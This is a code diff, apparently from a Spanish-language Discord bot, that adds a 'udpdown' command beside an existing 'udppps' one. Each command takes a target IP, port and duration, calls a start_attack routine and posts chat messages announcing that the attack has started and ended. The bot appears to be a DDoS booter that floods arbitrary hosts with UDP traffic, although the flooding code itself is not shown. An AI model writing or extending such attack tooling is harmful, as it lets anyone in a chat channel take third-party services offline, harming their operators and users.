@@ -181,5 +181,15 @@ async def udppps_cmd(ctx, ip: str, port: int, duration: int):
     embed = make_embed("💣 UDPPPS iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
     await ctx.send(embed=embed)
 
+@bot.command(name='udpdown')
+async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
+    async def notify_end():
+        embed = make_embed("✅ UDPDown terminado", "El ataque ha finalizado", IMAGE_URLS["attack"])
+        await ctx.send(embed=embed)
+
+    start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    embed = make_embed("💣 UDPDown iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
+    await ctx.send(embed=embed)
+    
 # Ejecutar el bot
 bot.run(token)
